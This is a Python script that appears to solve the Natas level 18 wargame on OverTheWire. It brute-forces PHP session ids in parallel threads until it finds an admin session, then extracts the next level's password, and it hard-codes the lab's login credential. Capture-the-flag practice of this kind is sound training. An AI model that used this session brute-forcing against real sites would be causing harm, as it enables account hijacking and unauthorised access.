import requests

account = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
login = account + ':' + password + '@'

protocol = 'http://'
URL = 'natas18.natas.labs.overthewire.org/'
params = '?debug=&username=admin&password='

target = protocol + login + URL + params

def checkSession( args_list ) :
	global stopCheck
	global threadCount
	global thread_list
	beg_sessid, end_sessid = args_list
	T = '\t[Thread No.' + str( beg_sessid ) + '\t]\t'

	for i in range( beg_sessid, end_sessid ):
		mutex.acquire()
		if stopCheck == 1 :
			threadCount -= 1
			mutex.release()
			#print T + 'Other one found the session !!'
			return
		mutex.release()
		print T + 'Check session_id : ' + str(i)
		cookies = dict( PHPSESSID=str(i) )
		r = requests.get( target, cookies = cookies )
		if r.content.find('You are an admin') != -1 :
			content = r.content
			idx = content.find('Password: ')
			password = content[idx:idx+42]
			print '\n' + T + 'The password is : ' + password + '\n'
			print '[Closing all threads...]'
			mutex.acquire()
			stopCheck = 1
			threadCount -= 1
			mutex.release()
			return
	mutex.acquire()
	if stopCheck == 0 :
		print T + 'Not Found OAQ'	
	threadCount -= 1
	mutex.release()
	return 

import threading

class myThread ( threading.Thread ) :
	def __init__( self, callback, args_list ) :
		threading.Thread.__init__( self )
		#self.beg_sessid = beg_sessid
		#self.end_sessid = end_sessid
		self.args_list = args_list
		self.callback = callback

	def run( self ) :
		#checkSession( self.beg_sessid, self.end_sessid )
		self.callback( self.args_list )


min_sessid = 1
max_sessid = 640 + 1
step = 10

stopCheck = 0
threadCount = 0
thread_list = []
mutex = threading.Lock()

for i in range( min_sessid, max_sessid, step ) :
	try :
		beg_sessid = i
		end_sessid = i + step
		if end_sessid > max_sessid :
			end_sessid = max_sessid
		print '[main] Create thread : ' + str(i)
		threadCount += 1
		myThread( checkSession, ( beg_sessid, end_sessid ) ).start()
	except :
		print 'Fail to create Thread ranged from ' + str(beg_sessid) + ' to ' + str(end_sessid)

while True : 
	if threadCount <= 0 :
		break

print '[main] END'

